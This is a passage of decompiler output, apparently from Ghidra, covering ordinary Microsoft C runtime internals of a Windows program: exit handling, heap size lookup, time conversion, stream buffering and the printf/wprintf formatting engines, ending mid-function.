void FUN_00405ef7(UINT param_1,int param_2,int param_3)

{
  HANDLE hProcess;
  code **ppcVar1;
  UINT uExitCode;
  
  if (_DAT_0041233c == 1) {
    uExitCode = param_1;
    hProcess = GetCurrentProcess();
    TerminateProcess(hProcess,uExitCode);
  }
  _DAT_00412338 = 1;
  DAT_00412334 = (undefined)param_3;
  if (param_2 == 0) {
    if ((DAT_00413914 != (code **)0x0) &&
       (ppcVar1 = (code **)(DAT_00413910 - 4), DAT_00413914 <= ppcVar1)) {
      do {
        if (*ppcVar1 != (code *)0x0) {
          (**ppcVar1)();
        }
        ppcVar1 = ppcVar1 + -1;
      } while (DAT_00413914 <= ppcVar1);
    }
    FUN_00405f90(&DAT_0040f044,&DAT_0040f04c);
  }
  FUN_00405f90(&DAT_0040f050,&DAT_0040f058);
  if (param_3 != 0) {
    return;
  }
  _DAT_0041233c = 1;
                    // WARNING: Subroutine does not return
  ExitProcess(param_1);
}



void FUN_00405f90(code **param_1,code **param_2)

{
  for (; param_1 < param_2; param_1 = param_1 + 1) {
    if (*param_1 != (code *)0x0) {
      (**param_1)();
    }
  }
  return;
}



SIZE_T FUN_00405faa(LPCVOID param_1)

{
  int iVar1;
  byte *pbVar2;
  SIZE_T SVar3;
  undefined local_c [4];
  undefined local_8 [4];
  
  if (DAT_00413904 == 3) {
    iVar1 = FUN_004075c0(param_1);
    if (iVar1 != 0) {
      return *(int *)((int)param_1 + -4) - 9;
    }
  }
  else if ((DAT_00413904 == 2) &&
          (pbVar2 = (byte *)FUN_0040831b(param_1,local_c,local_8), pbVar2 != (byte *)0x0)) {
    return (uint)*pbVar2 << 4;
  }
  SVar3 = HeapSize(DAT_00413900,0,param_1);
  return SVar3;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_0040600b(int param_1,int param_2,int param_3,int param_4,int param_5,int param_6,int param_7
                )

{
  int iVar1;
  undefined local_28 [8];
  int local_20;
  int local_18;
  uint local_14;
  int local_c;
  
  local_14 = param_1 - 0x76c;
  if (((int)local_14 < 0x46) || (0x8a < (int)local_14)) {
    param_6 = -1;
  }
  else {
    local_c = *(int *)(&DAT_0040f928 + param_2 * 4) + param_3;
    if (((local_14 & 3) == 0) && (2 < param_2)) {
      local_c = local_c + 1;
    }
    FUN_0040881c();
    local_20 = param_4;
    local_18 = param_2 + -1;
    param_6 = ((param_4 + (local_14 * 0x16d + local_c + (param_1 + -0x76d >> 2)) * 0x18) * 0x3c +
              param_5) * 0x3c + DAT_00411bb0 + 0x7c558180 + param_6;
    if ((param_7 == 1) ||
       (((param_7 == -1 && (_DAT_00411bb4 != 0)) && (iVar1 = FUN_00408a8f(local_28), iVar1 != 0))))
    {
      param_6 = param_6 + _DAT_00411bb8;
    }
  }
  return param_6;
}



uint FUN_004060cd(uint param_1,int *param_2)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  undefined *puVar6;
  
  piVar4 = param_2;
  uVar1 = param_2[3];
  uVar2 = param_2[4];
  if (((uVar1 & 0x82) == 0) || ((uVar1 & 0x40) != 0)) {
LAB_004061d6:
    param_2[3] = uVar1 | 0x20;
  }
  else {
    if ((uVar1 & 1) != 0) {
      param_2[1] = 0;
      if ((uVar1 & 0x10) == 0) goto LAB_004061d6;
      *param_2 = param_2[2];
      param_2[3] = uVar1 & 0xfffffffe;
    }
    uVar1 = param_2[3];
    param_2[1] = 0;
    param_2 = (int *)0x0;
    piVar4[3] = uVar1 & 0xffffffef | 2;
    if (((uVar1 & 0x10c) == 0) &&
       (((piVar4 != (int *)&DAT_00411db0 && (piVar4 != (int *)&DAT_00411dd0)) ||
        (iVar5 = FUN_0040a00d(uVar2), iVar5 == 0)))) {
      FUN_00409fc9(piVar4);
    }
    if ((*(ushort *)(piVar4 + 3) & 0x108) == 0) {
      iVar5 = 1;
      param_2 = (int *)FUN_00408f66(uVar2,&param_1,1);
    }
    else {
      iVar3 = piVar4[2];
      iVar5 = *piVar4 - iVar3;
      *piVar4 = iVar3 + 1;
      piVar4[1] = piVar4[6] + -1;
      if (iVar5 < 1) {
        if (uVar2 == 0xffffffff) {
          puVar6 = &DAT_00411cf8;
        }
        else {
          puVar6 = (undefined *)((&DAT_004137e0)[(int)uVar2 >> 5] + (uVar2 & 0x1f) * 8);
        }
        if ((puVar6[4] & 0x20) != 0) {
          FUN_00409f2f(uVar2,0,2);
        }
      }
      else {
        param_2 = (int *)FUN_00408f66(uVar2,iVar3,iVar5);
      }
      *(undefined *)piVar4[2] = (undefined)param_1;
    }
    if (param_2 == (int *)iVar5) {
      return param_1 & 0xff;
    }
    piVar4[3] = piVar4[3] | 0x20;
  }
  return 0xffffffff;
}



// WARNING: Type propagation algorithm not settling
// WARNING: Could not reconcile some variable overlaps

int FUN_004061e2(undefined4 param_1,byte *param_2,undefined4 *param_3)

{
  short sVar1;
  uint uVar2;
  ushort *puVar3;
  undefined4 uVar4;
  short *psVar5;
  int *piVar6;
  undefined *puVar7;
  int iVar8;
  int iVar9;
  byte bVar10;
  int iVar11;
  ushort *puVar12;
  undefined *puVar13;
  ulonglong uVar14;
  ushort local_250 [255];
  undefined local_51;
  undefined4 local_50;
  undefined4 local_4c;
  undefined local_48 [4];
  undefined4 local_44;
  int local_40;
  int local_3c;
  int local_38;
  ushort *local_34;
  int local_30;
  int local_2c;
  int local_28;
  undefined8 local_24;
  undefined local_1a;
  char local_19;
  int local_18;
  undefined *local_14;
  ushort *local_10;
  int local_c;
  uint local_8;
  
  local_40 = 0;
  local_14 = (undefined *)0x0;
  bVar10 = *param_2;
  param_2 = param_2 + 1;
  local_18 = 0;
  local_34 = (ushort *)0x0;
  do {
    if ((bVar10 == 0) || (local_18 < 0)) {
      return local_18;
    }
    if (((char)bVar10 < ' ') || ('x' < (char)bVar10)) {
      uVar2 = 0;
    }
    else {
      uVar2 = *(byte *)((int)&PTR_LAB_0040d370 + (int)(char)bVar10) & 0xf;
    }
    local_40 = (int)(char)(&DAT_0040d390)[uVar2 * 8 + local_40] >> 4;
    switch(local_40) {
    case 0:
switchD_0040625e_caseD_0:
      local_30 = 0;
      if ((PTR_DAT_00411998[(uint)bVar10 * 2 + 1] & 0x80) != 0) {
        FUN_00406980((int)(char)bVar10,param_1,&local_18);
        bVar10 = *param_2;
        param_2 = param_2 + 1;
      }
      FUN_00406980((int)(char)bVar10,param_1,&local_18);
      break;
    case 1:
      local_c = -1;
      local_44 = 0;
      local_3c = 0;
      local_2c = 0;
      local_28 = 0;
      local_8 = 0;
      local_30 = 0;
      break;
    case 2:
      if (bVar10 == 0x20) {
        local_8 = local_8 | 2;
      }
      else if (bVar10 == 0x23) {
        local_8 = local_8 | 0x80;
      }
      else if (bVar10 == 0x2b) {
        local_8 = local_8 | 1;
      }
      else if (bVar10 == 0x2d) {
        local_8 = local_8 | 4;
      }
      else if (bVar10 == 0x30) {
        local_8 = local_8 | 8;
      }
      break;
    case 3:
      if (bVar10 == 0x2a) {
        local_2c = FUN_00406a1e(&param_3);
        if (local_2c < 0) {
          local_8 = local_8 | 4;
          local_2c = -local_2c;
        }
      }
      else {
        local_2c = (char)bVar10 + -0x30 + local_2c * 10;
      }
      break;
    case 4:
      local_c = 0;
      break;
    case 5:
      if (bVar10 == 0x2a) {
        local_c = FUN_00406a1e(&param_3);
        if (local_c < 0) {
          local_c = -1;
        }
      }
      else {
        local_c = (char)bVar10 + -0x30 + local_c * 10;
      }
      break;
    case 6:
      if (bVar10 == 0x49) {
        if ((*param_2 != 0x36) || (param_2[1] != 0x34)) {
          local_40 = 0;
          goto switchD_0040625e_caseD_0;
        }
        param_2 = param_2 + 2;
        local_8 = local_8 | 0x8000;
      }
      else if (bVar10 == 0x68) {
        local_8 = local_8 | 0x20;
      }
      else if (bVar10 == 0x6c) {
        local_8 = local_8 | 0x10;
      }
      else if (bVar10 == 0x77) {
        local_8 = local_8 | 0x800;
      }
      break;
    case 7:
      puVar12 = local_10;
      if ((char)bVar10 < 'h') {
        if ((char)bVar10 < 'e') {
          if ((char)bVar10 < 'Y') {
            if (bVar10 != 0x58) {
              if (bVar10 == 0x43) {
                if ((local_8 & 0x830) == 0) {
                  local_8 = local_8 | 0x800;
                }
                goto LAB_004064b3;
              }
              if ((bVar10 != 0x45) && (bVar10 != 0x47)) {
                if (bVar10 == 0x53) {
                  if ((local_8 & 0x830) == 0) {
                    local_8 = local_8 | 0x800;
                  }
                  goto LAB_00406423;
                }
                goto LAB_00406836;
              }
              local_44 = 1;
              bVar10 = bVar10 + 0x20;
              goto LAB_00406485;
            }
LAB_00406692:
            local_38 = 7;
LAB_00406699:
            local_14 = (undefined *)0x10;
            if ((local_8 & 0x80) != 0) {
              local_1a = 0x30;
              local_19 = (char)local_38 + 'Q';
              local_28 = 2;
            }
            goto LAB_00406702;
          }
          if (bVar10 == 0x5a) {
            psVar5 = (short *)FUN_00406a1e(&param_3);
            if ((psVar5 == (short *)0x0) ||
               (puVar12 = *(ushort **)(psVar5 + 2), puVar12 == (ushort *)0x0)) {
              local_10 = (ushort *)PTR_DAT_0040f960;
              puVar12 = (ushort *)PTR_DAT_0040f960;
              goto LAB_00406613;
            }
            if ((local_8 & 0x800) == 0) {
              local_30 = 0;
              local_14 = (undefined *)(int)*psVar5;
            }
            else {
              local_14 = (undefined *)((uint)(int)*psVar5 >> 1);
              local_30 = 1;
            }
          }
          else if (bVar10 == 99) {
LAB_004064b3:
            if ((local_8 & 0x810) == 0) {
              local_250[0]._0_1_ = FUN_00406a1e(&param_3);
              local_14 = (undefined *)0x1;
            }
            else {
              uVar4 = FUN_00406a3b();
              local_14 = (undefined *)FUN_0040a0ec(local_250,uVar4);
              if ((int)local_14 < 0) {
                local_3c = 1;
              }
            }
            puVar12 = local_250;
          }
          else if (bVar10 == 100) goto LAB_004066f7;
        }
        else {
LAB_00406485:
          local_8 = local_8 | 0x40;
          puVar12 = local_250;
          puVar3 = local_250;
          if (local_c < 0) {
            local_c = 6;
          }
          else if (local_c == 0) {
            if (bVar10 == 0x67) {
              local_c = 1;
            }
          }
          else {
            if (0x200 < local_c) {
              local_c = 0x200;
            }
            if (0xa3 < local_c) {
              local_10 = local_250;
              local_34 = (ushort *)_malloc(local_c + 0x15d);
              puVar12 = local_34;
              puVar3 = local_34;
              if (local_34 == (ushort *)0x0) {
                local_c = 0xa3;
                puVar12 = local_250;
                puVar3 = local_10;
              }
            }
          }
          local_10 = puVar3;
          local_50 = *param_3;
          local_4c = param_3[1];
          param_3 = param_3 + 2;
          (*(code *)PTR_FUN_00412010)(&local_50,puVar12,(int)(char)bVar10,local_c,local_44);
          uVar2 = local_8 & 0x80;
          if ((uVar2 != 0) && (local_c == 0)) {
            (*(code *)PTR_FUN_0041201c)(puVar12);
          }
          if ((bVar10 == 0x67) && (uVar2 == 0)) {
            (*(code *)PTR_FUN_00412014)(puVar12);
          }
          if (*(char *)puVar12 == '-') {
            local_8 = local_8 | 0x100;
            puVar12 = (ushort *)((int)puVar12 + 1);
            local_10 = puVar12;
          }
LAB_00406613:
          local_14 = (undefined *)_strlen((char *)puVar12);
          puVar12 = local_10;
        }
LAB_00406836:
        local_10 = puVar12;
        uVar2 = local_8;
        if (local_3c == 0) {
          if ((local_8 & 0x40) != 0) {
            if ((local_8 & 0x100) == 0) {
              if ((local_8 & 1) == 0) {
                if ((local_8 & 2) == 0) goto LAB_0040686e;
                local_1a = 0x20;
              }
              else {
                local_1a = 0x2b;
              }
            }
            else {
              local_1a = 0x2d;
            }
            local_28 = 1;
          }
LAB_0040686e:
          iVar11 = (local_2c - local_28) - (int)local_14;
          if ((local_8 & 0xc) == 0) {
            FUN_004069b5(0x20,iVar11,param_1,&local_18);
          }
          FUN_004069e6(&local_1a,local_28,param_1,&local_18);
          if (((uVar2 & 8) != 0) && ((uVar2 & 4) == 0)) {
            FUN_004069b5(0x30,iVar11,param_1,&local_18);
          }
          if ((local_30 == 0) || (puVar7 = local_14, puVar12 = local_10, (int)local_14 < 1)) {
            FUN_004069e6(local_10,local_14,param_1,&local_18);
          }
          else {
            do {
              puVar13 = puVar7 + -1;
              iVar8 = FUN_0040a0ec(local_48,(uint)puVar7 & 0xffff0000 | (uint)*puVar12);
              if (iVar8 < 1) break;
              FUN_004069e6(local_48,iVar8,param_1,&local_18);
              puVar7 = puVar13;
              puVar12 = puVar12 + 1;
            } while (puVar13 != (undefined *)0x0);
          }
          if ((local_8 & 4) != 0) {
            FUN_004069b5(0x20,iVar11,param_1,&local_18);
          }
        }
      }
      else {
        if (bVar10 == 0x69) {
LAB_004066f7:
          local_8 = local_8 | 0x40;
LAB_004066fb:
          local_14 = (undefined *)0xa;
LAB_00406702:
          if ((local_8 & 0x8000) == 0) {
            if ((local_8 & 0x20) == 0) {
              if ((local_8 & 0x40) == 0) {
                uVar2 = FUN_00406a1e(&param_3);
                uVar14 = (ulonglong)uVar2;
                goto LAB_00406755;
              }
              uVar2 = FUN_00406a1e(&param_3);
            }
            else if ((local_8 & 0x40) == 0) {
              uVar2 = FUN_00406a1e(&param_3);
              uVar2 = uVar2 & 0xffff;
            }
            else {
              sVar1 = FUN_00406a1e(&param_3);
              uVar2 = (uint)sVar1;
            }
            uVar14 = (ulonglong)(int)uVar2;
          }
          else {
            uVar14 = FUN_00406a2b(&param_3);
          }
LAB_00406755:
          if ((((local_8 & 0x40) != 0) && ((longlong)uVar14 < 0x100000000)) &&
             ((longlong)uVar14 < 0)) {
            uVar14 = CONCAT44(-((int)(uVar14 >> 0x20) + (uint)((int)uVar14 != 0)),-(int)uVar14);
            local_8 = local_8 | 0x100;
          }
          local_24._4_4_ = (uint)(uVar14 >> 0x20);
          local_24._0_4_ = (uint)uVar14;
          if ((local_8 & 0x8000) == 0) {
            local_24._4_4_ = 0;
          }
          local_24 = uVar14 & 0xffffffff | (ulonglong)local_24._4_4_ << 0x20;
          if (local_c < 0) {
            local_c = 1;
          }
          else {
            local_8 = local_8 & 0xfffffff7;
            if (0x200 < local_c) {
              local_c = 0x200;
            }
          }
          if (((uint)local_24 | local_24._4_4_) == 0) {
            local_28 = 0;
          }
          local_10 = (ushort *)&local_51;
          while ((iVar8 = (int)local_14, iVar11 = local_c + -1, 0 < local_c || (local_24 != 0))) {
            iVar9 = (int)local_14 >> 0x1f;
            local_c = iVar11;
            iVar11 = __aullrem(local_24,local_14,iVar9);
            iVar11 = iVar11 + 0x30;
            uVar14 = __aulldiv(local_24,iVar8,iVar9);
            if (0x39 < iVar11) {
              iVar11 = iVar11 + local_38;
            }
            puVar12 = (ushort *)((int)local_10 + -1);
            local_24 = uVar14;
            *(char *)local_10 = (char)iVar11;
            local_10 = puVar12;
          }
          local_14 = &local_51 + -(int)local_10;
          puVar12 = (ushort *)((int)local_10 + 1);
          local_c = iVar11;
          if (((local_8 & 0x200) != 0) &&
             ((*(char *)puVar12 != '0' || (local_14 == (undefined *)0x0)))) {
            local_14 = (undefined *)((int)&local_50 + -(int)local_10);
            *(char *)local_10 = '0';
            puVar12 = local_10;
          }
          goto LAB_00406836;
        }
        if (bVar10 != 0x6e) {
          if (bVar10 == 0x6f) {
            local_14 = (undefined *)0x8;
            if ((local_8 & 0x80) != 0) {
              local_8 = local_8 | 0x200;
            }
            goto LAB_00406702;
          }
          if (bVar10 == 0x70) {
            local_c = 8;
            goto LAB_00406692;
          }
          if (bVar10 == 0x73) {
LAB_00406423:
            iVar11 = 0x7fffffff;
            if (local_c != -1) {
              iVar11 = local_c;
            }
            puVar3 = (ushort *)FUN_00406a1e(&param_3);
            if ((local_8 & 0x810) == 0) {
              puVar12 = puVar3;
              if (puVar3 == (ushort *)0x0) {
                puVar3 = (ushort *)PTR_DAT_0040f960;
                puVar12 = (ushort *)PTR_DAT_0040f960;
              }
              for (; (iVar11 != 0 && (*(char *)puVar3 != '\0'));
                  puVar3 = (ushort *)((int)puVar3 + 1)) {
                iVar11 = iVar11 + -1;
              }
              local_14 = (undefined *)((int)puVar3 - (int)puVar12);
            }
            else {
              if (puVar3 == (ushort *)0x0) {
                puVar3 = (ushort *)PTR_DAT_0040f964;
              }
              local_30 = 1;
              for (puVar12 = puVar3; (iVar11 != 0 && (*puVar12 != 0)); puVar12 = puVar12 + 1) {
                iVar11 = iVar11 + -1;
              }
              local_14 = (undefined *)((int)puVar12 - (int)puVar3 >> 1);
              puVar12 = puVar3;
            }
            goto LAB_00406836;
          }
          if (bVar10 != 0x75) {
            if (bVar10 != 0x78) goto LAB_00406836;
            local_38 = 0x27;
            goto LAB_00406699;
          }
          goto LAB_004066fb;
        }
        piVar6 = (int *)FUN_00406a1e(&param_3);
        if ((local_8 & 0x20) == 0) {
          *piVar6 = local_18;
        }
        else {
          *(undefined2 *)piVar6 = (undefined2)local_18;
        }
        local_3c = 1;
      }
      if (local_34 != (ushort *)0x0) {
        FUN_00404b0a(local_34);
        local_34 = (ushort *)0x0;
      }
    }
    bVar10 = *param_2;
    param_2 = param_2 + 1;
  } while( true );
}



void FUN_00406980(uint param_1,int *param_2,int *param_3)

{
  int *piVar1;
  
  piVar1 = param_2 + 1;
  *piVar1 = *piVar1 + -1;
  if (*piVar1 < 0) {
    param_1 = FUN_004060cd(param_1,param_2);
  }
  else {
    *(undefined *)*param_2 = (undefined)param_1;
    *param_2 = *param_2 + 1;
    param_1 = param_1 & 0xff;
  }
  if (param_1 == 0xffffffff) {
    *param_3 = -1;
    return;
  }
  *param_3 = *param_3 + 1;
  return;
}



void FUN_004069b5(undefined4 param_1,int param_2,undefined4 param_3,int *param_4)

{
  if (0 < param_2) {
    do {
      param_2 = param_2 + -1;
      FUN_00406980(param_1,param_3,param_4);
      if (*param_4 == -1) {
        return;
      }
    } while (0 < param_2);
  }
  return;
}



void FUN_004069e6(char *param_1,int param_2,undefined4 param_3,int *param_4)

{
  char cVar1;
  
  if (0 < param_2) {
    do {
      param_2 = param_2 + -1;
      cVar1 = *param_1;
      param_1 = param_1 + 1;
      FUN_00406980((int)cVar1,param_3,param_4);
      if (*param_4 == -1) {
        return;
      }
    } while (0 < param_2);
  }
  return;
}



undefined4 FUN_00406a1e(int *param_1)

{
  *param_1 = *param_1 + 4;
  return *(undefined4 *)(*param_1 + -4);
}



undefined8 FUN_00406a2b(int *param_1)

{
  *param_1 = *param_1 + 8;
  return *(undefined8 *)(*param_1 + -8);
}



uint FUN_00406a3b(uint *param_1)

{
  *param_1 = *param_1 + 4;
  return *param_1 & 0xffff0000 | (uint)*(ushort *)(*param_1 - 4);
}



// WARNING: Could not reconcile some variable overlaps

int FUN_00406a49(undefined4 param_1,ushort *param_2,undefined4 *param_3)

{
  int iVar1;
  short sVar2;
  uint uVar3;
  short *psVar4;
  int *piVar5;
  short *psVar6;
  int iVar7;
  ushort uVar8;
  uint unaff_EBX;
  short *psVar9;
  int iVar10;
  ulonglong uVar11;
  short local_458 [255];
  undefined2 local_259;
  undefined4 local_58;
  undefined4 local_54;
  int local_50;
  undefined4 local_4c;
  int local_48;
  undefined4 local_44;
  int local_40;
  int local_3c;
  short *local_38;
  undefined local_32;
  undefined local_31;
  int local_30;
  undefined2 local_2c;
  short local_2a;
  int local_28;
  int local_24;
  undefined8 local_20;
  int local_18;
  uint local_14;
  short *local_10;
  int local_c;
  short *local_8;
  
  local_48 = 0;
  uVar8 = *param_2;
  psVar9 = (short *)(unaff_EBX & 0xffff0000 | (uint)uVar8);
  local_14 = 0;
  local_18 = 0;
  local_38 = (short *)0x0;
  param_2 = param_2 + 1;
  do {
    if ((uVar8 == 0) || (local_18 < 0)) {
      return local_18;
    }
    uVar8 = (ushort)psVar9;
    if ((uVar8 < 0x20) || (0x78 < uVar8)) {
      uVar3 = 0;
    }
    else {
      uVar3 = *(byte *)((int)&PTR_LAB_0040d370 + ((uint)psVar9 & 0xffff)) & 0xf;
    }
    local_48 = (int)(char)(&DAT_0040d390)[uVar3 * 8 + local_48] >> 4;
    switch(local_48) {
    case 0:
switchD_00406ac2_caseD_0:
      local_28 = 1;
      FUN_004071de(psVar9,param_1,&local_18);
      break;
    case 1:
      local_c = -1;
      local_44 = 0;
      local_40 = 0;
      local_30 = 0;
      local_24 = 0;
      local_8 = (short *)0x0;
      local_28 = 0;
      break;
    case 2:
      uVar3 = (uint)psVar9 & 0xffff;
      if (uVar3 == 0x20) {
        local_8 = (short *)((uint)local_8 | 2);
      }
      else if (uVar3 == 0x23) {
        local_8 = (short *)((uint)local_8 | 0x80);
      }
      else if (uVar3 == 0x2b) {
        local_8 = (short *)((uint)local_8 | 1);
      }
      else if (uVar3 == 0x2d) {
        local_8 = (short *)((uint)local_8 | 4);
      }
      else if (uVar3 == 0x30) {
        local_8 = (short *)((uint)local_8 | 8);
      }
      break;
    case 3:
      if (uVar8 == 0x2a) {
        local_30 = FUN_00406a1e(&param_3);
        if (local_30 < 0) {
          local_8 = (short *)((uint)local_8 | 4);
          local_30 = -local_30;
        }
      }
      else {
        local_30 = (((uint)psVar9 & 0xffff) - 0x30) + local_30 * 10;
      }
      break;
    case 4:
      local_c = 0;
      break;
    case 5:
      if (uVar8 == 0x2a) {
        local_c = FUN_00406a1e(&param_3);
        if (local_c < 0) {
          local_c = -1;
        }
      }
      else {
        local_c = (((uint)psVar9 & 0xffff) - 0x30) + local_c * 10;
      }
      break;
    case 6:
      uVar3 = (uint)psVar9 & 0xffff;
      if (uVar3 == 0x49) {
        if ((*param_2 != 0x36) || (param_2[1] != 0x34)) {
          local_48 = 0;
          goto switchD_00406ac2_caseD_0;
        }
        param_2 = param_2 + 2;
        local_8 = (short *)((uint)local_8 | 0x8000);
      }
      else if (uVar3 == 0x68) {
        local_8 = (short *)((uint)local_8 | 0x20);
      }
      else if (uVar3 == 0x77) {
        local_8 = (short *)((uint)local_8 | 0x800);
      }
      break;
    case 7:
      uVar3 = (uint)psVar9 & 0xffff;
      psVar4 = local_10;
      if (uVar3 < 0x68) {
        if (uVar3 < 0x65) {
          if (uVar3 < 0x59) {
            if (uVar3 != 0x58) {
              if (uVar3 == 0x43) {
                if (((uint)local_8 & 0x830) == 0) {
                  local_8 = (short *)((uint)local_8 | 0x20);
                }
                goto LAB_00406cf9;
              }
              if ((uVar3 != 0x45) && (uVar3 != 0x47)) {
                if (uVar3 == 0x53) {
                  if (((uint)local_8 & 0x830) == 0) {
                    local_8 = (short *)((uint)local_8 | 0x20);
                  }
                  goto LAB_00406c59;
                }
                goto LAB_00407084;
              }
              local_44 = 1;
              psVar9 = psVar9 + 0x10;
              goto LAB_00406ccb;
            }
LAB_00406ee1:
            local_3c = 7;
LAB_00406ee4:
            local_14 = 0x10;
            if (((uint)local_8 & 0x80) != 0) {
              local_2c = 0x30;
              local_2a = (short)local_3c + 0x51;
              local_24 = 2;
            }
            goto LAB_00406f4a;
          }
          if (uVar3 == 0x5a) {
            psVar6 = (short *)FUN_00406a1e(&param_3);
            if ((psVar6 == (short *)0x0) ||
               (psVar4 = *(short **)(psVar6 + 2), psVar4 == (short *)0x0)) {
              local_10 = (short *)PTR_DAT_0040f960;
              psVar4 = (short *)PTR_DAT_0040f960;
              goto LAB_00406e68;
            }
            if (((uint)local_8 & 0x800) == 0) {
              local_28 = 0;
              local_14 = (uint)*psVar6;
            }
            else {
              local_14 = (uint)(int)*psVar6 >> 1;
              local_28 = 1;
            }
          }
          else if (uVar3 == 99) {
LAB_00406cf9:
            local_28 = 1;
            local_4c = FUN_00406a1e(&param_3);
            if (((uint)local_8 & 0x20) == 0) {
              local_458[0] = (short)local_4c;
            }
            else {
              local_31 = 0;
              local_32 = (undefined)local_4c;
              iVar10 = FUN_0040a245(local_458,&local_32,DAT_00411ba4);
              if (iVar10 < 0) {
                local_40 = 1;
              }
            }
            local_14 = 1;
            psVar4 = local_458;
          }
          else if (uVar3 == 100) goto LAB_00406f3f;
        }
        else {
LAB_00406ccb:
          local_8 = (short *)((uint)local_8 | 0x40);
          psVar4 = local_458;
          psVar6 = local_458;
          if (local_c < 0) {
            local_c = 6;
          }
          else if (local_c == 0) {
            if ((short)psVar9 == 0x67) {
              local_c = 1;
            }
          }
          else {
            if (0x200 < local_c) {
              local_c = 0x200;
            }
            if (0xa3 < local_c) {
              local_10 = local_458;
              local_38 = (short *)_malloc(local_c + 0x15d);
              psVar4 = local_38;
              psVar6 = local_38;
              if (local_38 == (short *)0x0) {
                local_c = 0xa3;
                psVar4 = local_458;
                psVar6 = local_10;
              }
            }
          }
          local_10 = psVar6;
          local_58 = *param_3;
          local_54 = param_3[1];
          param_3 = param_3 + 2;
          (*(code *)PTR_FUN_00412010)(&local_58,psVar4,(int)(char)psVar9,local_c,local_44);
          uVar3 = (uint)local_8 & 0x80;
          if ((uVar3 != 0) && (local_c == 0)) {
            (*(code *)PTR_FUN_0041201c)(psVar4);
          }
          if (((short)psVar9 == 0x67) && (uVar3 == 0)) {
            (*(code *)PTR_FUN_00412014)(psVar4);
          }
          if (*(byte *)psVar4 == 0x2d) {
            local_8 = (short *)((uint)local_8 | 0x100);
            psVar4 = (short *)((int)psVar4 + 1);
            local_10 = psVar4;
          }
LAB_00406e68:
          local_14 = _strlen((char *)psVar4);
          psVar4 = local_10;
        }
LAB_00407084:
        local_10 = psVar4;
        psVar4 = local_8;
        if (local_40 == 0) {
          if (((uint)local_8 & 0x40) != 0) {
            if (((uint)local_8 & 0x100) == 0) {
              if (((uint)local_8 & 1) == 0) {
                if (((uint)local_8 & 2) == 0) goto LAB_004070c2;
                local_2c = 0x20;
              }
              else {
                local_2c = 0x2b;
              }
            }
            else {
              local_2c = 0x2d;
            }
            local_24 = 1;
          }
LAB_004070c2:
          iVar10 = (local_30 - local_24) - local_14;
          if (((uint)local_8 & 0xc) == 0) {
            FUN_004071fe(0x20,iVar10,param_1,&local_18);
          }
          FUN_0040722f(&local_2c,local_24,param_1,&local_18);
          if ((((uint)psVar4 & 8) != 0) && (((uint)psVar4 & 4) == 0)) {
            FUN_004071fe(0x30,iVar10,param_1,&local_18);
          }
          if ((local_28 == 0) && (psVar9 = local_10, uVar3 = local_14, 0 < (int)local_14)) {
            do {
              uVar3 = uVar3 - 1;
              local_50 = FUN_0040a245(&local_4c,psVar9,DAT_00411ba4);
              psVar4 = psVar9;
              if (local_50 < 1) break;
              FUN_004071de(local_4c,param_1,&local_18);
              psVar4 = (short *)((int)psVar9 + local_50);
              psVar9 = psVar4;
            } while (0 < (int)uVar3);
          }
          else {
            FUN_0040722f(local_10,local_14,param_1,&local_18);
          }
          psVar9 = psVar4;
          if (((uint)local_8 & 4) != 0) {
            FUN_004071fe(0x20,iVar10,param_1,&local_18);
          }
        }
      }
      else {
        if (uVar3 == 0x69) {
LAB_00406f3f:
          local_8 = (short *)((uint)local_8 | 0x40);
LAB_00406f43:
          local_14 = 10;
LAB_00406f4a:
          if (((uint)local_8 & 0x8000) == 0) {
            if (((uint)local_8 & 0x20) == 0) {
              if (((uint)local_8 & 0x40) == 0) {
                uVar3 = FUN_00406a1e(&param_3);
                uVar11 = (ulonglong)uVar3;
                goto LAB_00406f9d;
              }
              uVar3 = FUN_00406a1e(&param_3);
            }
            else if (((uint)local_8 & 0x40) == 0) {
              uVar3 = FUN_00406a1e(&param_3);
              uVar3 = uVar3 & 0xffff;
            }
            else {
              sVar2 = FUN_00406a1e(&param_3);
              uVar3 = (uint)sVar2;
            }
            uVar11 = (ulonglong)(int)uVar3;
          }
          else {
            uVar11 = FUN_00406a2b(&param_3);
          }
LAB_00406f9d:
          if (((((uint)local_8 & 0x40) != 0) && ((longlong)uVar11 < 0x100000000)) &&
             ((longlong)uVar11 < 0)) {
            uVar11 = CONCAT44(-((int)(uVar11 >> 0x20) + (uint)((int)uVar11 != 0)),-(int)uVar11);
            local_8 = (short *)((uint)local_8 | 0x100);
          }
          local_20._4_4_ = (uint)(uVar11 >> 0x20);
          local_20._0_4_ = (uint)uVar11;
          if (((uint)local_8 & 0x8000) == 0) {
            local_20._4_4_ = 0;
          }
          local_20 = uVar11 & 0xffffffff | (ulonglong)local_20._4_4_ << 0x20;
          if (local_c < 0) {
            local_c = 1;
          }
          else {
            local_8 = (short *)((uint)local_8 & 0xfffffff7);
            if (0x200 < local_c) {
              local_c = 0x200;
            }
          }
          if (((uint)local_20 | local_20._4_4_) == 0) {
            local_24 = 0;
          }
          local_10 = &local_259;
          while ((iVar1 = local_14, iVar10 = local_c + -1, 0 < local_c || (local_20 != 0))) {
            iVar7 = (int)local_14 >> 0x1f;
            local_c = iVar10;
            iVar10 = __aullrem(local_20,local_14,iVar7);
            psVar9 = (short *)(iVar10 + 0x30);
            uVar11 = __aulldiv(local_20,iVar1,iVar7);
            if (0x39 < (int)psVar9) {
              psVar9 = (short *)((int)psVar9 + local_3c);
            }
            psVar4 = (short *)((int)local_10 + -1);
            local_20 = uVar11;
            *(byte *)local_10 = (byte)psVar9;
            local_10 = psVar4;
          }
          local_14 = (int)&local_259 + -(int)local_10;
          psVar4 = (short *)((int)local_10 + 1);
          local_c = iVar10;
          if ((((uint)local_8 & 0x200) != 0) && ((*(byte *)psVar4 != 0x30 || (local_14 == 0)))) {
            local_14 = (int)&local_259 + -(int)local_10 + 1;
            *(byte *)local_10 = 0x30;
            psVar4 = local_10;
          }
          goto LAB_00407084;
        }
        if (uVar3 != 0x6e) {
          if (uVar3 == 0x6f) {
            local_14 = 8;
            if (((uint)local_8 & 0x80) != 0) {
              local_8 = (short *)((uint)local_8 | 0x200);
            }
            goto LAB_00406f4a;
          }
          if (uVar3 == 0x70) {
            local_c = 8;
            goto LAB_00406ee1;
          }
          if (uVar3 == 0x73) {
LAB_00406c59:
            iVar10 = 0x7fffffff;
            if (local_c != -1) {
              iVar10 = local_c;
            }
            psVar4 = (short *)FUN_00406a1e(&param_3);
            if (((uint)local_8 & 0x20) == 0) {
